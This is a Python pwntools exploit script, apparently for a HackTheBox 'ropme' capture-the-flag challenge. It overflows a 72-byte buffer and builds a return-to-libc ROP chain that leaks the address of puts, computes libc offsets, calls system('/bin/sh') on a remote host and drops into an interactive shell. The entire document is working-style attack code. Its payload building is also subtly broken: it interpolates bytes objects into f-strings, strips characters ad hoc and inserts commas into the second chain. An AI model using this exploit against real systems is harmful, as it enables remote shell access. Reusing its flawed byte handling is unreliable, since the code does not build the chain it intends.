#!/usr/bin/env python
#import gdb
from pwn import *
import argparse

context.os = 'linux'
context.arch = 'amd64'
context.word_size = 64
context.endian = 'little'
context.log_level = 'DEBUG'

pty = process.PTY
program_name = './ropme'
elf = ELF(program_name)
dremote_server = 'docker.hackthebox.eu'
remote_server = '68.183.38.65'
PORT = 32761
#dPORT = '30090'

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'     , '-d', action="store_true")
parser.add_argument('--remote'  , '-r', action="store_true")
args = parser.parse_args()

#if args.remote:
print('connecting')
p = remote(remote_server, PORT)
#else:
 #   p = process(program_name, stdin=pty, stdout=pty)

if args.dbg:
    gdb.attach(p, '''
            vmmap
            b *main
            ''')

junk = "A" * 72
pop_rdi = p64(0x4006d3)
got_put = p64(0x601018)
plt_put = p64(0x4005e0)
plt_main = p64(0x400626)

payload = f"{junk}{pop_rdi}{got_put}{plt_put}{plt_main}"

payload = payload.replace("b", "")
payload = payload.replace("'b'", "")
payload = payload.replace("'", "")
payload = payload.replace("`", "")
payload = payload.replace("@", "")

p.recvuntil(b"ROP me outside, how 'about dah?")
p.sendline(bytes(payload, encoding='utf8'))
#p.clean()
#p.recvline(keepends=False)
#p.interactive()
try:
    #p.interactive("")
    leaked_puts = p.recvline().strip().ljust(8, b"\x00")
except EOFError:
    print('error')


log.success('Leaked puts@GLIBC: ' + str(hex(u64(leaked_puts))))

leaked_puts = u64(leaked_puts)

libc_put = 0x0000000000006f690

offset = leaked_puts - libc_put

log.info(f"glibc offset:{libc_put} ")

libc_sys = 0x00000000000045390
libc_sh = 0x18cd17

sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)

payload = f'{junk}, {pop_rdi}, {sh}, {sys}'

p.recvuntil("ROP me outside, how 'about dah?")
p.sendline(payload)

p.interactive(prompt="")

